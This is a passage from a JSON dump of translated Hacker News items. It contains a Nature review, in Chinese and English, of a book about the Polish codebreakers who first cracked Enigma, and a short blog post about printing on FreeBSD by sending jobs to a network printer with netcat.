\u5206\u522b\u662f\u6cd5\u56fd\u3001\u82f1\u56fd\u548c\u6ce2\u5170\u5bc6\u7801\u7834\u8bd1\u5c0f\u7ec4\u7684\u7b80\u5199\u3002\u4f5c\u8005\u7684\u7814\u7a76\u5f88\u8f9b\u82e6\u3002\u6218\u540e\uff0c\u519b\u4e8b\u6587\u4ef6\u6563\u843d\u5728\u6b27\u6d32\u5404\u5730\uff0c\u6cd5\u56fd\u7684\u5173\u952e\u8bb0\u5f55\u4ec5\u5728 2016 \u5e74\u624d\u88ab\u89e3\u5bc6\u3002\u8bb8\u591a\u539f\u59cb\u6ce2\u5170\u6587\u4ef6\u88ab\u9500\u6bc1\uff0c\u4f46\u6570\u5b66\u5bb6\u7684\u5bb6\u4eba\u5171\u4eab\u4e86\u79c1\u4eba\u4fe1\u4ef6\u3002\u56fe\u7075\u63ed\u793a\u4e86\u4e00\u4e2a\u5173\u4e8e\u667a\u6167\u3001\u52c7\u6562\u548c\u53cb\u60c5\u7684\u975e\u51e1\u6545\u4e8b\uff0c\u8bfb\u8d77\u6765\u5c31\u50cf\u4e00\u672c\u6263\u4eba\u5fc3\u5f26\u200b\u200b\u7684\u95f4\u8c0d\u5c0f\u8bf4\u3002\u5728 1920 \u5e74\u7684\u4fc4\u6ce2\u6218\u4e89\u671f\u95f4\uff0c\u6ce2\u5170\u4eba\u5728\u5bc6\u7801\u5b66\u548c\u65e0\u7ebf\u7535\u5de5\u7a0b\u65b9\u9762\u7684\u6280\u80fd\u6c47\u805a\u5728\u4e00\u8d77\u3002\u4fe1\u53f7\u5458\u89e3\u7801\u4e86\u6765\u81ea\u7ea2\u519b\u519b\u4e8b\u6307\u6325\u5b98\u7ea6\u745f\u592b\u00b7\u65af\u5927\u6797\u7684\u4e00\u5c01\u7535\u62a5\uff0c\u8fd9\u8868\u660e\u5bf9\u534e\u6c99\u7684\u653b\u51fb\u8feb\u5728\u7709\u776b\u3002\u5e72\u6270\u4fc4\u7f57\u65af\u4eba\u7684\u65e0\u7ebf\u7535\u901a\u8baf\u4e3a\u4fdd\u536b\u548c\u62ef\u6551\u8fd9\u5ea7\u57ce\u5e02\u8d62\u5f97\u4e86\u8db3\u591f\u7684\u65f6\u95f4\u3002 Maksymilian Ci\u0119\u017cki \u548c Antoni Palluth \u662f\u8fd9\u4e9b\u4fe1\u53f7\u5458\u4e4b\u4e00\u3002 1920 \u5e74\u51b2\u7a81\u540e\uff0cCi\u0119\u017cki \u6210\u4e3a\u65e0\u7ebf\u7535\u60c5\u62a5\u90e8\u95e8\u7684\u8d1f\u8d23\u4eba\u3002 Palluth \u521b\u529e\u4e86\u4e00\u5bb6\u7535\u5b50\u8bbe\u5907\u516c\u53f8\uff0c\u5176\u4e2d\u5305\u62ec\u4e3a\u6ce2\u5170\u7279\u5de5\u63d0\u4f9b\u4fe1\u7528\u5361\u5927\u5c0f\u7684\u6536\u97f3\u673a\u3002 1926 \u5e74\uff0c\u5fb7\u56fd\u6d77\u519b\u5f00\u59cb\u4ee5\u66f4\u968f\u673a\u7684\u65b9\u5f0f\u53d1\u9001\u4fe1\u606f\uff0c\u8fd9\u4f7f\u5f97\u5b83\u4eec\u51e0\u4e4e\u65e0\u6cd5\u7834\u8bd1\u3002\u5b83\u4eec\u662f\u4f7f\u7528\u7c7b\u4f3c\u6253\u5b57\u673a\u7684 Enigma \u673a\u5668\u7f16\u7801\u7684\u3002\u952e\u76d8\u662f\u8fde\u7ebf\u7684\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u4e2a\u5b57\u6bcd\u4f1a\u70b9\u4eae\u9876\u90e8\u7684\u4e00\u7ec4\u706f\u6ce1\u4e2d\u7684\u53e6\u4e00\u4e2a\u5b57\u6bcd\u3002\u6bcf\u4e00\u6b21\u51fb\u952e\uff0c\u8f6c\u5b50\u90fd\u4f1a\u6539\u53d8\u7535\u8def\u7684\u8def\u5f84\u3002\u8fd9\u4e9b\u673a\u5668\u662f\u5546\u4e1a\u4e0a\u53ef\u7528\u7684\uff0c\u4f46\u7ecf\u8fc7\u4fee\u6539\u4ee5\u4f9b\u5fb7\u56fd\u519b\u4e8b\u4f7f\u7528\u3002\u5982\u679c\u4e0d\u77e5\u9053\u673a\u5668\u7684\u7cbe\u786e\u8bbe\u7f6e\uff0c\u5c31\u65e0\u6cd5\u89e3\u5f00\u4ee3\u7801\u3002\u8fd9\u672c\u4e66\u8bb2\u8ff0\u4e86 Ci\u0119\u017cki \u5982\u4f55\u8058\u8bf7\u4e00\u7fa4\u6570\u5b66\u5b66\u751f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u4ed6\u4eec\u5728\u5730\u4e0b\u5ba4\u548c\u6811\u6797\u6df1\u5904\u7684\u4e00\u4e2a\u63a9\u4f53\u4e2d\u5b89\u9759\u5730\u5de5\u4f5c\u3002\u6ce2\u5170\u6ce2\u5179\u5357\u5927\u5b66\u7684\u6821\u53cb\u739b\u4e3d\u5b89\u00b7\u96f7\u8036\u592b\u65af\u57fa\uff08Marian Rejewski\uff09\u5c31\u662f\u5176\u4e2d\u4e4b\u4e00\u3002\u638c\u8235\u7684\u662f Gwido Langer\uff0c\u4ed6\u662f\u4e00\u540d\u6ce2\u5170\u4eba\uff0c\u66fe\u4e3a\u5965\u5730\u5229\u519b\u961f\u4ece\u4e8b\u65e0\u7ebf\u7535\u60c5\u62a5\u5de5\u4f5c\u3002\n\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6cd5\u56fd\uff0c\u53e4\u65af\u5854\u592b\u00b7\u4f2f\u7279\u5170 (Gustave Bertrand) \u9886\u5bfc\u7740\u540c\u7b49\u90e8\u95e8\u3002\u6cd5\u56fd\u4eba\u6709\u4e00\u79cd\u66f4\u4f20\u7edf\u7684\u6536\u96c6\u4fe1\u606f\u7684\u65b9\u6cd5\uff1a\u4f18\u79c0\u7684\u4ee3\u7406\u4eba\u3001\u79d8\u5bc6\u4f1a\u8bae\u548c\u6177\u6168\u7684\u56de\u62a5\u3002\u4f2f\u7279\u5170\u7ba1\u7406\u7740\u4e24\u4e2a\u5f3a\u5927\u7684\u95f4\u8c0d\u3002\u9c81\u9053\u592b\u00b7\u65af\u6258\u66fc\uff08Rudolf Stallmann\uff09\u2014\u2014\u4ee3\u53f7\u96f7\u514b\u65af\uff08Rex\uff09\u2014\u2014\u662f\u4e00\u4f4d\u5fb7\u56fd\u4eba\uff0c\u4ed6\u66fe\u5047\u626e\u6210\u7537\u7235\u5411\u8d4c\u573a\u89c2\u4f17\u6325\u970d\uff1b\u4ed6\u8f7b\u677e\u5730\u5b66\u4f1a\u4e86\u8bed\u8a00\u548c\u4eba\u3002 Rex \u62db\u52df\u4e86 Hans-Thilo Schmidt\uff0c\u5373 Asche \u7279\u5de5\uff0c\u4ed6\u7684\u5144\u5f1f\u662f\u5fb7\u56fd\u519b\u961f\u7684\u4e0a\u6821\u3002 Schmidt \u5411\u6cd5\u56fd\u4eba\u63d0\u4f9b\u4e86\u6210\u7bb1\u7684\u519b\u4e8b\u6587\u4ef6\uff0cRex \u6536\u5230\u4e86\u8fd9\u4e9b\u6587\u4ef6\uff0cBertrand \u548c\u4ed6\u7684\u540c\u4e8b\u4eec\u5728\u9152\u5e97\u7684\u6d74\u5ba4\u91cc\u62cd\u7167\u3002\u4f2f\u7279\u5170\u5efa\u7acb\u4e86\u4e00\u4e2a\u5171\u4eab\u60c5\u62a5\u7684\u7f51\u7edc\uff0c\u5305\u62ec\u4e0e\u6ce2\u5170\u548c\u82f1\u56fd\u3002 1931 \u5e74\uff0c\u4ed6\u540c\u610f\u5411\u5170\u683c\u63d0\u4f9b\u5fb7\u56fd\u519b\u4e8b\u6587\u4ef6\uff0c\u5982\u679c\u6ce2\u5170\u4eba\u5c06\u89e3\u5bc6\u7684\u5fb7\u56fd\u4fe1\u606f\u4f20\u56de\u3002\u65bd\u5bc6\u7279\u4f20\u9012\u7684\u5176\u4e2d\u4e00\u4efd\u6587\u4ef6\u662f Enigma \u7684\u624b\u518c\u3002 Langer\u3001Ci\u0119\u017cki \u548c Rejewski \u8df3\u4e0a\u4e86\u5b83\u3002\u4ed6\u4eec\u53d1\u73b0\u6dfb\u52a0\u5230\u673a\u5668\u524d\u9762\u7684\u9762\u677f\u6539\u53d8\u4e86\u8bbe\u7f6e\uff0c\u5c3d\u7ba1\u4ed6\u4eec\u4ecd\u7136\u65e0\u6cd5\u786e\u5b9a\u8bbe\u5907\u662f\u5982\u4f55\u63a5\u7ebf\u7684\u3002\u4ed6\u4eec\u5f00\u59cb\u6536\u96c6\u7f16\u7801\u4fe1\u606f\u5e76\u8fd0\u7528\u4ed6\u4eec\u7684\u667a\u6167\u5bfb\u627e\u7ebf\u7d22\u3002\u6709\u65f6\u53d1\u4ef6\u4eba\u4f1a\u72af\u9519\u8bef\u3002\u5fb7\u56fd\u58eb\u5175\u53ef\u80fd\u4f1a\u4f7f\u7528\u7b80\u5355\u7684\u4e09\u4e2a\u5b57\u6bcd\u7ec4\u5408\uff0c\u4f8b\u5982 QQQ\uff0c\u5c06\u8bbe\u7f6e\u5e7f\u64ad\u5230\u63a5\u6536\u5668\u3002\u6709\u65f6\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u88ab\u731c\u5230\uff1a\u4f8b\u5982\uff0c\u4ed6\u4eec\u7ecf\u5e38\u8bf4 maschine defekt\u3002\u5230 1936 \u5e74\uff0c\u5728\u6218\u4e89\u51c6\u5907\u9636\u6bb5\uff0c\u5fb7\u56fd\u519b\u65b9\u6b63\u5728\u52a0\u5f3a\u5176\u901a\u8baf\u3002\u540c\u5e74 10 \u6708\uff0c\u53d1\u9001\u8005\u5f00\u59cb\u6bcf\u5929\u91cd\u7f6e Enigma \u673a\u5668\u3002 Dermot Turing \u8ba4\u4e3a\u53e6\u4e00\u4f4d\u6ce2\u5170\u6570\u5b66\u5bb6 Jerzy R\u00f3\u017cycki \u610f\u8bc6\u5230\u8fd9\u6539\u53d8\u4e86\u5b57\u6bcd\u7684\u9891\u7387\uff0c\u63ed\u793a\u4e86\u989d\u5916\u7684\u4fe1\u606f\u3002\u8be5\u56e2\u961f\u5f00\u53d1\u4e86\u5904\u7406\u6570\u767e\u79cd\u6392\u5217\u7684\u5de5\u5177\uff0c\u5305\u62ec\u7a7f\u5b54\u5361\u7247\u548c\u5e26\u6709\u6a21\u4eff Enigma \u7684\u8f6c\u5b50\u7684\u673a\u68b0\u8bbe\u5907\uff0c\u51fa\u4e8e\u4e0d\u786e\u5b9a\u7684\u539f\u56e0\uff0c\u8be5\u56e2\u961f\u5c06\u5176\u79f0\u4e3a\u70b8\u5f39\u3002\u8fd9\u4e24\u4e2a\u6982\u5ff5\u540e\u6765\u90fd\u88ab Alan Turing \u4f7f\u7528\u548c\u5f00\u53d1\u3002 Bertrand \u5c06\u8fd9\u4e9b\u4fe1\u606f\u53cd\u9988\u7ed9\u4e86\u82f1\u56fd\u7684\u5bc6\u7801\u7834\u8bd1\u8005\uff0c\u4ed6\u4eec\u5728\u4e66\u4e2d\u7ed9\u4eba\u7684\u611f\u89c9\u662f\u5e7d\u9ed8\u4f46\u51b7\u6f20\u3002\u4ed6\u4eec\u79f0\u6cd5\u56fd\u5feb\u9012\u2014\u2014\u7528\u7ea2\u8272\u6807\u8bb0 TR\u00c8S SECRET\u2014\u2014\u7329\u7ea2\u8272 pimpernels\u3002 1939 \u5e74 7 \u6708\u4e0b\u65ec\uff0c\u5c31\u5728\u5fb7\u56fd\u519b\u961f\u8fdb\u5165\u6ce2\u5170\u524d\u4e00\u4e2a\u591a\u6708\uff0c\u4f2f\u7279\u5170\u5b89\u6392\u4e86\u53d7\u4eba\u5c0a\u656c\u7684\u82f1\u56fd\u5bc6\u7801\u5b66\u5bb6 Dillwyn &#39;Dilly&#39; Knox\uff08\u4ed6\u5df2\u7ecf\u5728 Bletchley \u4ece\u4e8b Enigma \u5de5\u4f5c\uff09\u5728\u534e\u6c99\u9644\u8fd1\u4f1a\u89c1\u5170\u683c\u7684\u56e2\u961f\u3002\u6ce2\u5170\u4eba\u60f3\u4f20\u6388\u4ed6\u4eec\u7684\u77e5\u8bc6\u3002\u8bfa\u514b\u65af\u6700\u521d\u5bf9\u4ed6\u4eec\u6bb4\u6253\u4ed6\u611f\u5230\u6124\u6012\uff0c\u540e\u6765\u5411\u6ce2\u5170\u4eba\u53d1\u9001\u4e86\u4e00\u6761\u5370\u6709\u8d5b\u9a6c\u573a\u666f\u7684\u4e1d\u5dfe\uff0c\u4ee5\u627f\u8ba4\u4ed6\u4eec\u8d62\u4e86\u3002\u82f1\u56fd\u4eba\u7acb\u5373\u52a0\u5927\u4e86\u5e03\u83b1\u5207\u5229\u516c\u56ed\u7684\u5bc6\u7801\u7834\u89e3\u5de5\u4f5c\uff1b\u51e0\u4e2a\u6708\u5185\uff0c\u827e\u4f26\u00b7\u56fe\u7075\u91cd\u65b0\u8bbe\u8ba1\u4e86\u70b8\u5f39\uff0c\u4f7f\u5176\u5de5\u4f5c\u5f97\u66f4\u5feb\u3002\u6ce2\u5170\u4eba\u7684\u89c1\u89e3\u4e3a\u4ed6\u8282\u7701\u4e86\u4e00\u5e74\u7684\u5de5\u4f5c\u65f6\u95f4\u3002\u6218\u4e89\u7206\u53d1\u540e\uff0c\u6ce2\u5170\u65e0\u7ebf\u7535\u60c5\u62a5\u5355\u4f4d\u88ab\u89e3\u6563\u3002\u5bc6\u7801\u7834\u8bd1\u8005\u63a9\u57cb\u4e86\u4ed6\u4eec\u7684\u7b14\u8bb0\u548c\u673a\u5668\u5e76\u9003\u8dd1\u4e86\u3002\u4e00\u4e9b\u4eba\u6700\u7ec8\u53bb\u4e86\u963f\u5c14\u53ca\u5229\u4e9a\uff0c\u5176\u4f59\u7684\u4eba\u5728\u6cd5\u56fd\u4e3a Bertrand \u5de5\u4f5c\uff0c\u540e\u8005\u5728\u6cd5\u56fd\u5357\u90e8\u7684\u4e00\u5ea7\u57ce\u5821\u4e2d\u6210\u7acb\u4e86\u4e00\u4e2a\u65e0\u7ebf\u7535\u60c5\u62a5\u5c0f\u7ec4\u3002\u5728\u4ee4\u4eba\u60ca\u53f9\u7684\u6bb5\u843d\u4e2d\uff0c\u8fd9\u672c\u4e66\u63ed\u793a\u4e86\u5927\u591a\u6570\u6ce2\u5170\u5bc6\u7801\u7834\u8bd1\u8005\u5982\u4f55\u5ea6\u8fc7\u6218\u4e89\uff0c\u5728\u6cd5\u56fd\u88ab\u5360\u9886\u65f6\u5229\u7528\u6cd5\u56fd\u62b5\u6297\u8fd0\u52a8\u5e76\u8eb2\u907f\u5fb7\u56fd\u7684\u519b\u4e8b\u60c5\u62a5\u90e8\u95e8\u548c\u79d8\u5bc6\u8b66\u5bdf\u3002\u4f5c\u4e3a\u5b9d\u8d35\u7684\u8d44\u4ea7\uff0c\u5bc6\u7801\u7834\u89e3\u8005\u662f\u4e0d\u5141\u8bb8\u6218\u6597\u7684\u3002\u4e66\u4e2d\u7684\u611f\u4eba\u7167\u7247\u663e\u793a\uff0c\u4ed6\u4eec\u4e92\u76f8\u5f00\u73a9\u7b11\uff0c\u5e76\u5728\u707e\u96be\u4e2d\u4e0e\u5973\u53cb\u5171\u5ea6\u65f6\u5149\u3002\n\u6700\u7ec8\uff0cCi\u0119\u017cki \u548c Langer \u88ab\u902e\u6355\u5e76\u62d8\u7981\u5728\u82cf\u53f0\u5fb7\u5730\u533a\uff08\u73b0\u5728\u662f\u6377\u514b\u5171\u548c\u56fd\u7684\u4e00\u90e8\u5206\uff09\u3002\u6218\u4e89\u7ed3\u675f\u540e\uff0c\u4ed6\u4eec\u5b9a\u5c45\u5728\u82cf\u683c\u5170\u3002\u5e15\u5362\u65af\u4e8e 1945 \u5e74\u5728\u5fb7\u56fd\u9047\u96be\uff0c\u5f53\u65f6\u4ed6\u5728\u8428\u514b\u68ee\u8c6a\u68ee\u96c6\u4e2d\u8425\u5de5\u4f5c\u7684\u4e00\u5bb6\u98de\u673a\u5de5\u5382\u906d\u5230\u8f70\u70b8\u3002\u4f2f\u7279\u5170\u5de7\u5999\u5730\u53d1\u6325\u4e86\u5404\u65b9\u529b\u91cf\u3002\u4e3a\u4e86\u907f\u514d\u6210\u4e3a\u53cc\u91cd\u95f4\u8c0d\uff0c\u4ed6\u6700\u7ec8\u6210\u4e3a\u4e86\u4e00\u540d\u5c06\u519b\u3002 1972 \u5e74\uff0c\u4ed6\u5199\u4e86\u4e00\u672c\u5173\u4e8e Enigma \u7684\u6d41\u884c\u6cd5\u8bed\u4e66\uff0c\u4e8e\u662f X\u3001Y\u3001Z \u548c Bletchley \u7684\u6545\u4e8b\u5f00\u59cb\u6d41\u4f20\u5f00\u6765\u3002\u7535\u5b50\u90ae\u4ef6\u5730\u5740 \u662f\u7684\uff01\u6ce8\u518c\u6211\u4ee5\u63a5\u6536\u6bcf\u65e5\u81ea\u7136\u7b80\u62a5\u7535\u5b50\u90ae\u4ef6\u3002\u6211\u540c\u610f\u5c06\u6839\u636e Nature \u548c Springer Nature Limited \u9690\u79c1\u653f\u7b56\u5904\u7406\u6211\u7684\u4fe1\u606f\u3002", "note_en": "X, Y &amp; Z: The Real Story of How Enigma Was Broken  Dermot Turing The History Press (2018)\n Alan Turing\u2019s crucial unscrambling of German messages in the Second World War was a tour de force of codebreaking. From 1940 onwards, Turing and his team engineered hundreds of electronic machines, dubbed bombes, which decrypted the thousands of missives sent by enemy commanders each day to guide their soldiers. This deluge of knowledge shortened the war. Bletchley Park, UK \u2014 the secret centre where it all happened \u2014 rightly gained its place in history. But as with all breakthroughs, many more people laid the foundations.\n In his book  X, Y &amp; Z, Dermot Turing, the great mathematician\u2019s nephew, tells the gripping story of a band of Polish mathematicians who figured out much about how German Enigma encoding machines operated, years before Alan Turing did. The Poles shared their secrets with French and British intelligence services before and during the Second World War \u2014 the letters X, Y and Z were shorthand for the French, British and Polish codebreaking teams, respectively.\n The author\u2019s research is painstaking. After the war, military documents were scattered across Europe, and key French records were declassified only in 2016. Many original Polish papers were destroyed, but the mathematicians\u2019 families have shared personal letters. Turing unearths a remarkable tale of intellect, bravery and camaraderie that reads like a nail-biting spy novel.\n Polish skills in cryptography and radio engineering came together during the 1920 Russo-Polish War. Signallers decoded a telegram from Red Army military commander Joseph Stalin, which indicated that an attack on Warsaw was imminent. Jamming the Russians\u2019 radio communications bought enough time to secure and save the city. Maksymilian Ci\u0119\u017cki and Antoni Palluth were among those signallers. After the 1920 conflict, Ci\u0119\u017cki became leader of a radio-intelligence unit. Palluth set up a business making electronic equipment, including radios the size of a credit card for Polish secret agents.\n  In 1926, the German navy began to send messages that were scrambled in a more random way, making them almost impossible to decipher. They were encoded using the typewriter-like Enigma machine. The keyboard was wired so that typing one letter lit up a different one in a set of bulbs on top. Rotors altered the path of the electric circuit with every keystroke. The machines were commercially available but modified for German military use. Without knowing the precise setting of a machine, there was no way to unpick the code.\n The book tells how Ci\u0119\u017cki hired a group of mathematics students to crack the problem. They worked quietly in basements and in a bunker deep in the woods. Marian Rejewski, an alumnus of Pozna\u0144 University in Poland, was one. At the helm was Gwido Langer, a Pole who had worked in radio intelligence for the Austrian army.\n Meanwhile, in France, Gustave Bertrand headed the equivalent unit. The French had a more conventional approach to gathering information: good agents, clandestine meetings and generous pay-offs. Bertrand managed two formidable spies. Rudolf Stallmann \u2014 code name Rex \u2014 was a German card-sharp who had posed as a baron to fleece casino-goers; he picked up languages and people with ease. Rex recruited Hans-Thilo Schmidt, or Agent Asche, whose brother was a colonel in the German army. Schmidt supplied cases of military documents to the French, which Rex received and Bertrand and his colleagues photographed in hotel bathrooms.\n Bertrand built up a network for sharing intelligence, including with Poland and the United Kingdom. In 1931, he agreed to supply Langer with German military documents if the Poles would pass back decrypted German messages. One of those documents, passed on by Schmidt, was a manual for Enigma.\n  Langer, Ci\u0119\u017cki and Rejewski leapt on it. They discovered that a panel added to the front of the machine altered the settings, although they still could not tell how the device was wired. They set about collecting coded messages and applied their wits to find clues. Sometimes the senders made telling mistakes. The German soldiers might use simple sets of three letters, such as QQQ, to broadcast the settings to the receiver. Occasionally, the messages could be guessed: for instance, they often said  maschine defekt.\n By 1936, in the run-up to war, the German military was tightening its communications. In October that year, the senders began to reset the Enigma machines daily. Dermot Turing credits another Polish mathematician, Jerzy R\u00f3\u017cycki, with realizing that this altered the frequency of letters, revealing extra information. The team developed tools to work through the hundreds of permutations, including punched cards and a mechanical device with rotors that mimicked Enigma, which, for uncertain reasons, the team called a  bomba. Both concepts were later used and developed by Alan Turing.\n Bertrand fed this information back to Britain\u2019s codebreakers, who come across in the book as humorous but aloof. They called the French dispatches \u2014 stamped  TR\u00c8S SECRET in red \u2014 scarlet pimpernels. In late July 1939, just over a month before the German army marched into Poland, Bertrand arranged for the respected British cryptologist Dillwyn \u2018Dilly\u2019 Knox (who was already working on Enigma at Bletchley) to meet Langer\u2019s team near Warsaw. The Poles wanted to pass on their knowledge. Initially angry that they had beaten him to it, Knox later sent the Poles a silk scarf printed with a horse-racing scene to concede that they had won.\n  The British immediately ramped up codebreaking efforts at Bletchley Park; within a few months, Alan Turing had re-engineered the bombes to work more quickly. The Polish insights saved him a year of work.\n When war broke out, the Polish radio-intelligence unit was wound up. The codebreakers buried their notes and machines and fled. Some ended up in Algeria, the rest in France working for Bertrand, who had set up a radio-intelligence group in a chateau in southern France. In breathtaking passages, the book reveals how most of the Polish codebreakers made it through the war, tapping into the French Resistance and dodging Germany\u2019s military-intelligence services and secret police when France became occupied. As valuable assets, the codebreakers were not allowed to fight. Touching photographs in the book show them joking with each other and spending time with girlfriends amid the devastation.\n Eventually, Ci\u0119\u017cki and Langer were arrested and interned in the Sudetenland (now part of the Czech Republic). After the war, they settled in Scotland. Palluth was killed in Germany in 1945, when an aeroplane factory in which he was working at Sachsenhausen concentration camp was bombed. Bertrand artfully played all sides. Avoiding becoming a double agent, he ended up a general. In 1972, he wrote a popular French book about Enigma, and so the story of X, Y and Z and Bletchley began to seep out.\n                    Email address    Yes! Sign me up to receive the daily  Nature Briefing email. I agree my information will be processed in accordance with the  Nature and Springer Nature Limited  Privacy Policy.", "posttime": "2021-08-05 20:54:35", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "enigma,heroes,\u5fb7\u56fd", "title": "\u88ab\u9057\u5fd8\u7684 Enigma Story (2018) \u82f1\u96c4", "title_en": "Forgotten heroes of the Enigma Story (2018)", "transed": 1, "url": "https://www.nature.com/articles/d41586-018-06149-y", "via": "", "real_tags": ["enigma", "heroes", "\u5fb7\u56fd"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071335, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u6700\u8fd1\u5c06\u6211\u7684\u65e5\u5e38\u7b14\u8bb0\u672c\u7535\u8111\u8fc1\u79fb\u5230\u4e86 FreeBSD\u3002\u6211\u6709\u4e00\u53f0\u8054\u7f51\u7684 HP LaserJet\u3002\u5728 Linux \u4e0a\u4f7f\u7528 CUPS 10 \u591a\u5e74\u540e\uff0c\u6211\u4e00\u76f4\u5bb3\u6015\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8bbe\u7f6e\u8fd9\u53f0\u6253\u5370\u673a\u3002\u4f46\u662f\u8fd9\u4e00\u5929\u6765\u4e86\u3002\u6211\u4e0d\u5f97\u4e0d\u6253\u5370\u76f8\u5f53\u591a\u7684\u6587\u6863\uff0c\u6240\u4ee5\u6211\u51b3\u5b9a\u786c\u7740\u5934\u76ae\u5728 FreeBSD \u4e0a\u8bbe\u7f6e\u6253\u5370\u3002\u6211\u53bb\u4e86 FreeBSD \u624b\u518c\u3002\u65b9\u4fbf\u7684\u662f\uff0c\u4ed6\u4eec\u6709\u4e00\u7ae0\u5173\u4e8e\u6253\u5370\u3002\u9274\u4e8e\u6211\u8fc7\u53bb\u4f7f\u7528 CUPS \u7684\u7ecf\u9a8c\uff0c\u6211\u8ba4\u4e3a\u8fd9\u5c06\u662f\u4e00\u6b21\u5371\u9669\u7684\u65c5\u7a0b\uff0c\u6240\u4ee5\u6211\u5728\u5f00\u59cb\u4e4b\u524d\u9605\u8bfb\u4e86\u6574\u4e2a\u6587\u6863\u3002\u7b2c 4 \u8282\u7a81\u51fa\uff1a\u76f4\u63a5\u6253\u5370\u5230\u7f51\u7edc\u6253\u5370\u673a\u53d6\u51b3\u4e8e\u6253\u5370\u673a\u7684\u80fd\u529b\uff0c\u4f46\u5927\u591a\u6570\u63a5\u53d7\u7aef\u53e3 9100 \u4e0a\u7684\u6253\u5370\u4f5c\u4e1a\uff0c\u5e76\u4e14 nc(1) \u53ef\u4ee5\u4e0e\u5b83\u200b\u200b\u4eec\u4e00\u8d77\u4f7f\u7528\u3002\u6211\u4e0d\u5f97\u4e0d\u591a\u6b21\u9605\u8bfb\u8fd9\u7bc7\u6587\u7ae0\u3002\u8dc6\u62f3\u9053\u3002\u4f7f\u7528\u7f51\u732b\uff1f\u5f53\u7136\uff0c\u6211\u5728 FreeBSD \u5185\u6838\u4e2d\u9057\u6f0f\u4e86\u4e00\u4e9b\u5c06\u7f51\u7edc\u6253\u5370\u673a\u914d\u7f6e\u4e3a\u522b\u540d\u4e3a netlaser \u7684\u672c\u5730\u7f51\u7edc\u76ee\u6807\u7684\u9b54\u6cd5\uff0c\u5b83\u4e3a\u6211\u5904\u7406\u4e86\u6240\u6709\u7684\u6253\u5370\u9b54\u6cd5\u3002\u4f46\u662f\u5982\u4f55\uff1f\u591a\u5e74\u4ece CUPS \u4e2d\u7c7b\u4f3c\u540d\u79f0\u7684\u6253\u5370\u9a71\u52a8\u7a0b\u5e8f\u5217\u8868\u4e2d\u4efb\u610f\u6311\u9009\uff0c\u4f7f\u6211\u7684\u5927\u8111\u65e0\u6cd5\u63a5\u53d7\u6240\u5199\u7684\u5185\u5bb9\u3002\u6211\u5f88\u56f0\u60d1\u3002\u5728\u8bd5\u56fe\u7834\u8bd1\u6587\u6863\u4e2d\u7684\u5176\u4ed6\u90e8\u5206\u540e\uff0c\u6211\u51b3\u5b9a\u6211\u4f1a\u53bb\u505a\u3002\u7ecf\u8fc7 10 \u591a\u5e74\u7684 Linux \u53d1\u884c\u7248\u63a8\u52a8 CUPS\u3002\u5341\u591a\u5e74\u6765\uff0c\u6211\u4ece\u4e0d\u5b8c\u5168\u4fe1\u4efb\u8fd9\u4e9b\u590d\u6742\u7684\u9a71\u52a8\u7a0b\u5e8f\u548c\u5b88\u62a4\u7a0b\u5e8f\u5806\u6808\uff0c\u4f46\u201c\u6ca1\u6709\u5b83\u5c31\u6d3b\u4e0d\u4e0b\u53bb\u201d\u3002 FreeBSD \u51fa\u73b0\u65f6\u5c31\u50cf\u201c\u662f\u7684\uff0c\u53ea\u9700\u4f7f\u7528 netcat\u201d\u3002\u4ed6\u4eec\u662f\u5bf9\u7684\u3002\u5c31\u7528\u7f51\u732b\u5427\u3002", "note_en": "I recently migrated my daily laptop to FreeBSD. I have a networked HP LaserJet. After 10+ years of CUPS on Linux, I had been dreading setting up this printer on yet another machine. But the day came. I had to print quite a few documents so I decided to bite the bullet and setup printing on FreeBSD.\n Off to the FreeBSD Handbook I went. Conveniently, they have a chapter on  Printing. Given my past experience with CUPS, I figured this was going to be a treacherous journey so I read the entire document before getting started. Section 4 stood out:\n Direct printing to network printers depends on the abilities of the printer, but most accept print jobs on port 9100, and  nc(1) can be used with them.\n   I had to read this several times. WTF. Use netcat? Surely I was missing some wizardry in the FreeBSD kernel that configured a network printer as some local network target aliased to netlaser, which handled all the printing magic for me. But how? Years of arbitrarily picking from a list of similarly named print drivers in CUPS prevented my brain from accepting what was written. I was confused. After trying to decipher the other sections in the document, I decided I would go for it.\n    After 10+ years of Linux distributions pushing CUPS on me. Over a decade of this complex stack of drivers and daemons that I never quite trusted but \u201ccouldn\u2019t live without.\u201d FreeBSD comes along and is like \u201cyeah, just use netcat.\u201d And they\u2019re right. Just use netcat.", "posttime": "2021-08-05 20:54:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u6253\u5370,cups,freebsd", "title": "\u518d\u89c1 CUPS\uff1a\u4f7f\u7528 Netcat \u6253\u5370", "title_en": "Bye CUPS: Printing with Netcat", "transed": 1, "url": "https://retrohacker.substack.com/p/bye-cups-printing-with-netcat", "via": "", "real_tags": ["\u6253\u5370", "cups", "freebsd"]}, {"category": "", "categoryclass": "", "imagename": "11f1999481af50daa189491722665b99.jpg", "infoid": 1071333, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": 